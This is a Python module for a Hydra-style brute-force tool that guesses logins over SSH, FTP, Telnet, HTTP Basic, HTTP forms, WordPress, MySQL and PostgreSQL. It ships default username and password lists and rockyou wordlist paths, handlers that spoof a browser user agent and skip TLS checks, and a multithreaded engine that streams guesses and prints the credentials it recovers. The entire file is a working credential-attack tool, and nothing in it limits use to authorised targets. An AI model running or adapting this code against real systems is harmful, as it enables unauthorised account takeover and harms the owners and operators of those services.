"""
Multi-protocol brute-force module (Hydra-style)
Supports: SSH, FTP, HTTP Basic, HTTP Form, WordPress, Telnet, MySQL, PostgreSQL

KEY DESIGN PRINCIPLE — DEFAULT DENY:
  Every handler returns False unless there is POSITIVE PROOF of login success.
  A redirect, a 200, or absence of an error message is NOT proof of success.
  Only explicit success indicators (logged-in cookie, shell prompt, etc.) count.
"""

import socket
import ssl
import re
import time
import os
import urllib.parse
import concurrent.futures
from typing import List, Dict, Optional, Tuple, Iterator
from colorama import Fore, Style

# ── Wordlist helpers ──────────────────────────────────────────────────────────

ROCKYOU_PATHS = [
    'rockyou.txt',
    'wordlists/rockyou.txt',
    r'C:\Tools\wordlists\rockyou.txt',
    '/usr/share/wordlists/rockyou.txt',
    '/usr/share/john/password.lst',
    '/opt/wordlists/rockyou.txt',
]

DEFAULT_USERNAMES = [
    'admin', 'root', 'administrator', 'user', 'test', 'guest',
    'oracle', 'postgres', 'mysql', 'ftp', 'anonymous', 'pi',
    'ubuntu', 'debian', 'kali', 'vagrant', 'ec2-user',
]

DEFAULT_PASSWORDS = [
    '', 'admin', 'password', '123456', 'root', 'toor', 'pass',
    'test', 'guest', '1234', '12345', '123456789', 'qwerty',
    'letmein', 'welcome', 'monkey', 'dragon', 'master', 'abc123',
    'password1', 'iloveyou', 'sunshine', 'princess', 'football',
    'shadow', 'superman', 'michael', 'login', 'admin123',
]


def find_rockyou() -> Optional[str]:
    for path in ROCKYOU_PATHS:
        if os.path.isfile(path):
            return path
    return None


def load_wordlist(path: str, limit: int = 0) -> List[str]:
    words = []
    try:
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            for i, line in enumerate(f):
                if limit and i >= limit:
                    break
                word = line.rstrip('\n\r')
                if word:
                    words.append(word)
    except Exception as e:
        print(f"{Fore.RED}[!] Could not load wordlist {path}: {e}{Style.RESET_ALL}")
    return words


def _stream_wordlist(path: str, limit: int = 0) -> Iterator[str]:
    """Yield passwords one at a time — avoids loading 14M lines into RAM."""
    count = 0
    try:
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                word = line.rstrip('\n\r')
                if word:
                    yield word
                    count += 1
                    if limit and count >= limit:
                        return
    except Exception as e:
        print(f"{Fore.RED}[!] Wordlist error: {e}{Style.RESET_ALL}")


# ── SSL context ───────────────────────────────────────────────────────────────

def _ssl_ctx() -> ssl.SSLContext:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


# ── Low-level HTTP helper ─────────────────────────────────────────────────────

def _http_raw(host: str, port: int, use_ssl: bool,
              method: str, path: str, headers: Dict[str, str],
              body: str = '', timeout: float = 8.0,
              read_full: bool = False) -> Tuple[int, Dict[str, List[str]], str]:
    """
    Send a raw HTTP/1.1 request.
    Returns (status_code, response_headers_multidict, response_body).
    Headers dict maps lowercase key → LIST of values (handles multiple Set-Cookie).
    Returns (-1, {}, '') on any network error.
    """
    try:
        raw = socket.create_connection((host, port), timeout=timeout)
        if use_ssl:
            sock = _ssl_ctx().wrap_socket(raw, server_hostname=host)
        else:
            sock = raw

        body_bytes = body.encode('utf-8') if body else b''

        hdr_lines = [f"{method} {path} HTTP/1.1", f"Host: {host}"]
        for k, v in headers.items():
            hdr_lines.append(f"{k}: {v}")
        if body_bytes:
            hdr_lines.append(f"Content-Length: {len(body_bytes)}")
        hdr_lines.append("Connection: close")
        hdr_lines.append("")
        hdr_lines.append("")

        request = "\r\n".join(hdr_lines).encode('utf-8')
        if body_bytes:
            # Replace the trailing \r\n\r\n with body
            request = request[:-2] + body_bytes

        sock.sendall(request)

        # Read response
        data = b''
        max_read = 131072 if read_full else 32768
        while len(data) < max_read:
            try:
                chunk = sock.recv(4096)
            except Exception:
                break
            if not chunk:
                break
            data += chunk
            # Stop after headers + small body unless full read requested
            if not read_full and b'\r\n\r\n' in data and len(data) > 4096:
                break
        sock.close()

        text = data.decode('utf-8', errors='replace')

        # Parse status line
        first_line = text.split('\r\n')[0]
        m = re.match(r'HTTP/[\d\.]+ (\d+)', first_line)
        status = int(m.group(1)) if m else -1

        # Parse headers — keep ALL values for each key (important for Set-Cookie)
        resp_headers: Dict[str, List[str]] = {}
        header_section = text.split('\r\n\r\n')[0] if '\r\n\r\n' in text else text
        for line in header_section.split('\r\n')[1:]:
            if ':' in line:
                k, _, v = line.partition(':')
                key = k.strip().lower()
                resp_headers.setdefault(key, []).append(v.strip())

        body_resp = text.split('\r\n\r\n', 1)[1] if '\r\n\r\n' in text else ''
        return status, resp_headers, body_resp

    except Exception:
        return -1, {}, ''


def _get_header(headers: Dict[str, List[str]], key: str) -> str:
    """Get first value of a header (case-insensitive)."""
    return (headers.get(key.lower(), ['']) or [''])[0]


def _get_all_headers(headers: Dict[str, List[str]], key: str) -> List[str]:
    """Get all values of a header (e.g. multiple Set-Cookie lines)."""
    return headers.get(key.lower(), [])


# ── WordPress login ───────────────────────────────────────────────────────────

def _try_wordpress(host: str, port: int, use_ssl: bool,
                   username: str, password: str,
                   timeout: float) -> bool:
    """
    WordPress wp-login.php brute-force using requests library.

    Uses a proper session so cookies are handled automatically across
    the GET (fetch nonce) and POST (submit credentials) requests.

    SUCCESS requires ALL of:
      1. HTTP 302 response to the POST
      2. Location header redirects to /wp-admin/ (NOT back to /wp-login.php)
      3. Session cookies contain 'wordpress_logged_in_'
    """
    try:
        import requests
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

        proto = 'https' if use_ssl else 'http'
        base_url  = f"{proto}://{host}"
        login_url = f"{base_url}/wp-login.php"

        session = requests.Session()
        session.verify = False
        session.headers.update({
            'User-Agent': ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                           'AppleWebKit/537.36 (KHTML, like Gecko) '
                           'Chrome/120.0.0.0 Safari/537.36'),
            'Accept': 'text/html,application/xhtml+xml,*/*',
            'Accept-Language': 'en-US,en;q=0.9',
        })

        # Step 1: GET wp-login.php to collect nonce + session cookies
        try:
            r1 = session.get(login_url, timeout=timeout, allow_redirects=True)
        except Exception:
            return False

        # Extract _wpnonce if present
        nonce_m = re.search(r'name="_wpnonce"\s+value="([^"]+)"', r1.text)
        nonce = nonce_m.group(1) if nonce_m else ''

        # Set the testcookie WordPress expects
        session.cookies.set('wordpress_test_cookie', 'WP Cookie check',
                            domain=host)

        # Step 2: POST credentials
        post_data = {
            'log':         username,
            'pwd':         password,
            'wp-submit':   'Log In',
            'redirect_to': '/wp-admin/',
            'testcookie':  '1',
        }
        if nonce:
            post_data['_wpnonce'] = nonce

        try:
            r2 = session.post(
                login_url,
                data=post_data,
                timeout=timeout,
                allow_redirects=False,  # Don't follow — we need to inspect the 302
                headers={'Referer': login_url,
                         'Origin': base_url}
            )
        except Exception:
            return False

        # Must be a redirect
        if r2.status_code != 302:
            return False

        # Location must point to wp-admin, NOT back to wp-login
        location = r2.headers.get('Location', '').lower()
        if not location:
            return False
        if 'wp-login' in location or 'reauth' in location or 'loggedout' in location:
            return False
        if 'wp-admin' not in location and 'dashboard' not in location:
            return False

        # Check for wordpress_logged_in_ cookie in the response OR session
        all_cookie_names = (
            list(r2.cookies.keys()) +
            list(session.cookies.keys())
        )
        has_logged_in = any('wordpress_logged_in_' in c for c in all_cookie_names)

        # Also check Set-Cookie header directly (some servers set it differently)
        set_cookie_header = r2.headers.get('Set-Cookie', '')
        if 'wordpress_logged_in_' in set_cookie_header:
            has_logged_in = True

        return has_logged_in

    except Exception:
        return False


# ── HTTP Basic Auth ───────────────────────────────────────────────────────────

def _try_http_basic(host: str, port: int, path: str,
                    username: str, password: str,
                    use_ssl: bool, timeout: float) -> bool:
    """
    HTTP Basic Auth — only succeeds on 200 with valid Authorization.
    200 = success, 401/403 = wrong creds, anything else = fail.
    NOTE: Do NOT use this for WordPress — WP doesn't use Basic Auth for login.
    """
    import base64
    creds = base64.b64encode(f"{username}:{password}".encode()).decode()
    status, _, _ = _http_raw(
        host, port, use_ssl, 'GET', path,
        {
            'Authorization': f'Basic {creds}',
            'User-Agent': 'Mozilla/5.0 BushidoScanner',
        },
        timeout=timeout
    )
    # Only 200 is success — 301/302 redirects are NOT success for Basic Auth
    return status == 200


# ── Generic HTTP form ─────────────────────────────────────────────────────────

def _try_http_form(host: str, port: int, path: str,
                   user_field: str, pass_field: str,
                   username: str, password: str,
                   fail_string: str, success_string: str,
                   use_ssl: bool, timeout: float) -> bool:
    """
    Generic HTTP POST form login.
    REQUIRES either:
      - success_string found in response body, OR
      - redirect to a path that does NOT contain the login path
    AND fail_string must NOT be present.
    Default-deny: returns False if neither success condition is met.
    """
    body = urllib.parse.urlencode({user_field: username, pass_field: password})

    status, resp_headers, body_resp = _http_raw(
        host, port, use_ssl, 'POST', path,
        {
            'User-Agent':   'Mozilla/5.0 BushidoScanner',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept':       'text/html,*/*',
        },
        body, timeout=timeout, read_full=True
    )

    if status == -1:
        return False

    # Fail string check — if present, definitely wrong
    if fail_string and fail_string.lower() in body_resp.lower():
        return False

    # Success string — if provided, REQUIRE it
    if success_string:
        return success_string.lower() in body_resp.lower()

    # Redirect check — only succeed if redirected AWAY from login path
    if status in (301, 302, 303):
        location = _get_header(resp_headers, 'location').lower()
        login_base = path.rstrip('/').lower()
        # If location contains the login path → wrong password (redirect back)
        if location and login_base not in location:
            return True
        return False

    # No success indicators → fail (default-deny)
    return False


# ── SSH ───────────────────────────────────────────────────────────────────────

def _try_ssh(target: str, port: int, username: str, password: str,
             timeout: float) -> bool:
    try:
        import paramiko
        import logging
        # Suppress paramiko's internal error logging — connection resets
        # are expected during brute-force and should not spam the terminal
        logging.getLogger('paramiko').setLevel(logging.CRITICAL)
        logging.getLogger('paramiko.transport').setLevel(logging.CRITICAL)

        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(
            target, port=port, username=username, password=password,
            timeout=timeout, allow_agent=False, look_for_keys=False,
            banner_timeout=timeout
        )
        client.close()
        return True
    except paramiko.AuthenticationException:
        return False
    except Exception:
        return False


# ── FTP ───────────────────────────────────────────────────────────────────────

def _try_ftp(target: str, port: int, username: str, password: str,
             timeout: float) -> bool:
    """
    FTP login with proper verification.

    Special case — anonymous FTP:
      Many FTP servers accept ANY password for the 'anonymous' user.
      To avoid false positives, we:
        1. Try the login
        2. If it succeeds, check the welcome message for '230' (logged in)
        3. For anonymous, also verify by trying a second login with a
           deliberately wrong password. If that ALSO succeeds, the server
           accepts everything — we only report the attempt if the password
           matches common anonymous conventions (empty, 'anonymous', email).
    """
    try:
        import ftplib

        ftp = ftplib.FTP()
        ftp.connect(target, port, timeout=timeout)

        try:
            ftp.login(username, password)
        except ftplib.error_perm:
            # 530 Login incorrect — definitive failure
            return False
        except Exception:
            return False

        # Login succeeded — now verify it's real
        welcome = ftp.getwelcome()

        # For anonymous FTP, check if the server accepts a garbage password too
        # If it does, only report passwords that are the canonical anonymous ones
        if username.lower() in ('anonymous', 'ftp', 'guest'):
            ftp.quit()

            # Test with a clearly wrong password
            ftp2 = ftplib.FTP()
            ftp2.connect(target, port, timeout=timeout)
            try:
                ftp2.login(username, 'BUSHIDO_WRONG_PASS_12345_XYZ')
                ftp2.quit()
                # Server accepts anything → only report canonical passwords
                canonical = {'', 'anonymous', 'ftp', 'guest',
                             username, f'{username}@example.com',
                             f'{username}@{target}'}
                return password.lower() in {c.lower() for c in canonical}
            except ftplib.error_perm:
                # Server rejected the wrong password → this password is real
                return True
            except Exception:
                return True
        else:
            ftp.quit()
            return True

    except ftplib.error_perm:
        return False
    except Exception:
        return False


# ── Telnet ────────────────────────────────────────────────────────────────────

def _try_telnet(target: str, port: int, username: str, password: str,
                timeout: float) -> bool:
    try:
        import telnetlib
        tn = telnetlib.Telnet(target, port, timeout=timeout)
        tn.read_until(b'login:', timeout=timeout)
        tn.write(username.encode() + b'\n')
        tn.read_until(b'Password:', timeout=timeout)
        tn.write(password.encode() + b'\n')
        result = tn.read_until(b'$', timeout=timeout)
        tn.close()
        low = result.lower()
        return (b'incorrect' not in low and b'failed' not in low
                and b'denied' not in low and b'invalid' not in low)
    except Exception:
        return False


# ── MySQL ─────────────────────────────────────────────────────────────────────

def _try_mysql(target: str, port: int, username: str, password: str,
               timeout: float) -> bool:
    try:
        import pymysql
        conn = pymysql.connect(
            host=target, port=port, user=username, password=password,
            connect_timeout=int(timeout)
        )
        conn.close()
        return True
    except Exception:
        return False


# ── PostgreSQL ────────────────────────────────────────────────────────────────

def _try_postgres(target: str, port: int, username: str, password: str,
                  timeout: float) -> bool:
    try:
        import psycopg2
        conn = psycopg2.connect(
            host=target, port=port, user=username, password=password,
            connect_timeout=int(timeout), dbname='postgres'
        )
        conn.close()
        return True
    except Exception:
        return False


# ── Dispatcher ────────────────────────────────────────────────────────────────

PROTOCOL_HANDLERS = {
    'ssh':        _try_ssh,
    'ftp':        _try_ftp,
    'telnet':     _try_telnet,
    'mysql':      _try_mysql,
    'postgresql': _try_postgres,
}


def _try_credential(protocol: str, target: str, port: int,
                    username: str, password: str,
                    timeout: float, http_opts: Dict) -> Tuple[bool, str, str]:
    """Single credential attempt. Returns (success, username, password)."""
    try:
        if protocol in ('http', 'https'):
            use_ssl = (protocol == 'https')
            mode    = http_opts.get('mode', 'basic')
            path    = http_opts.get('path', '/')

            if mode == 'wordpress':
                ok = _try_wordpress(target, port, use_ssl,
                                    username, password, timeout)
            elif mode == 'form':
                ok = _try_http_form(
                    target, port, path,
                    http_opts.get('user_field', 'username'),
                    http_opts.get('pass_field', 'password'),
                    username, password,
                    http_opts.get('fail_string', ''),
                    http_opts.get('success_string', ''),
                    use_ssl, timeout
                )
            else:
                ok = _try_http_basic(target, port, path,
                                     username, password, use_ssl, timeout)

        elif protocol in PROTOCOL_HANDLERS:
            ok = PROTOCOL_HANDLERS[protocol](target, port,
                                             username, password, timeout)
        else:
            ok = False

        return ok, username, password

    except Exception:
        return False, username, password


# ── Main brute-force engine ───────────────────────────────────────────────────

class BruteForcer:
    def __init__(self, threads: int = 32, timeout: float = 8.0,
                 delay: float = 0.0, stop_on_first: bool = False,
                 verbose: bool = False):
        self.threads       = threads
        self.timeout       = timeout
        self.delay         = delay
        self.stop_on_first = stop_on_first
        self.verbose       = verbose

    def run(self, protocol: str, target: str, port: int,
            usernames: List[str], passwords: List[str],
            http_opts: Dict = None,
            password_file: str = None,
            password_limit: int = 0) -> List[Dict]:
        """
        Run brute-force attack.
        Streams passwords from disk if password_file is given (memory-efficient).
        Returns list of confirmed credentials.
        """
        http_opts = http_opts or {}
        found     = []

        # Count total for progress
        if password_file:
            try:
                with open(password_file, 'r', encoding='utf-8', errors='ignore') as f:
                    total_passwords = sum(1 for ln in f if ln.strip())
                if password_limit:
                    total_passwords = min(total_passwords, password_limit)
            except Exception:
                total_passwords = 0
            password_source = _stream_wordlist(password_file, password_limit)
        else:
            total_passwords = len(passwords)
            password_source = iter(passwords)

        total     = len(usernames) * total_passwords
        attempted = 0
        stop_flag = [False]

        mode_label = (http_opts.get('mode', 'basic').upper()
                      if protocol in ('http', 'https') else '')
        print(f"\n  {Fore.CYAN}[*]{Style.RESET_ALL} Brute-forcing "
              f"{Fore.YELLOW}{protocol.upper()}"
              f"{' ' + mode_label if mode_label else ''}{Style.RESET_ALL} "
              f"on {Fore.WHITE}{target}:{port}{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}[*]{Style.RESET_ALL} "
              f"Usernames: {len(usernames)}  "
              f"Passwords: {total_passwords:,}  "
              f"Total: {total:,}  "
              f"Threads: {self.threads}")

        # Batch streaming executor — keeps only threads*4 futures in flight
        BATCH = self.threads * 4

        with concurrent.futures.ThreadPoolExecutor(
                max_workers=self.threads) as ex:
            batch_futures: Dict[
                concurrent.futures.Future, Tuple[str, str]] = {}

            def _submit_batch():
                while len(batch_futures) < BATCH and not stop_flag[0]:
                    try:
                        pwd = next(password_source)
                    except StopIteration:
                        return False
                    for user in usernames:
                        if stop_flag[0]:
                            return False
                        if self.delay:
                            time.sleep(self.delay)
                        f = ex.submit(_try_credential, protocol, target, port,
                                      user, pwd, self.timeout, http_opts)
                        batch_futures[f] = (user, pwd)
                return True

            _submit_batch()

            while batch_futures:
                done, _ = concurrent.futures.wait(
                    batch_futures,
                    return_when=concurrent.futures.FIRST_COMPLETED
                )

                for future in done:
                    u, p = batch_futures.pop(future)
                    attempted += 1

                    try:
                        ok, username, password = future.result()
                    except Exception:
                        ok, username, password = False, u, p

                    if attempted % 100 == 0:
                        pct = int(attempted / total * 100) if total else 0
                        print(f"\r  {Fore.CYAN}[*]{Style.RESET_ALL} "
                              f"Progress: {attempted:,}/{total:,} ({pct}%)  "
                              f"Found: {Fore.GREEN}{len(found)}"
                              f"{Style.RESET_ALL}   ",
                              end='', flush=True)

                    if ok:
                        # Deduplicate — same cred can arrive from parallel threads
                        cred_key = f"{username}:{password}"
                        already_found = any(
                            f"{r['username']}:{r['password']}" == cred_key
                            for r in found
                        )
                        if not already_found:
                            found.append({'username': username,
                                          'password': password})
                            print(f"\n  {Fore.GREEN}[+] FOUND!{Style.RESET_ALL}  "
                                  f"Username: {Fore.YELLOW}{username}{Style.RESET_ALL}  "
                                  f"Password: {Fore.RED}{password}{Style.RESET_ALL}")
                        # Stop immediately — cancel all pending futures
                        if self.stop_on_first:
                            stop_flag[0] = True
                            for f in list(batch_futures.keys()):
                                f.cancel()
                            batch_futures.clear()
                            break  # exit the 'for future in done' loop
                            break
                    elif self.verbose:
                        print(f"\r  {Fore.RED}[-]{Style.RESET_ALL} "
                              f"{u}:{p}   ", end='', flush=True)

                if not stop_flag[0]:
                    _submit_batch()
                else:
                    # Drain remaining futures without processing
                    for f in list(batch_futures.keys()):
                        f.cancel()
                    batch_futures.clear()

        print(f"\r  {Fore.CYAN}[*]{Style.RESET_ALL} Done. "
              f"Attempted: {attempted:,}  "
              f"Found: {Fore.GREEN}{len(found)}{Style.RESET_ALL}          ")

        return found


def print_brute_results(results: List[Dict], protocol: str,
                        target: str, port: int):
    print(f"\n{'=' * 62}")
    print(f"  {Fore.RED}BRUTE-FORCE RESULTS{Style.RESET_ALL}  --  "
          f"{protocol.upper()} {target}:{port}")
    print(f"{'=' * 62}")
    if not results:
        print(f"  {Fore.YELLOW}No valid credentials found.{Style.RESET_ALL}")
    else:
        for r in results:
            print(f"  {Fore.GREEN}[+]{Style.RESET_ALL}  "
                  f"Username: {Fore.YELLOW}{r['username']}{Style.RESET_ALL}  "
                  f"Password: {Fore.RED}{r['password']}{Style.RESET_ALL}")
    print(f"{'=' * 62}")
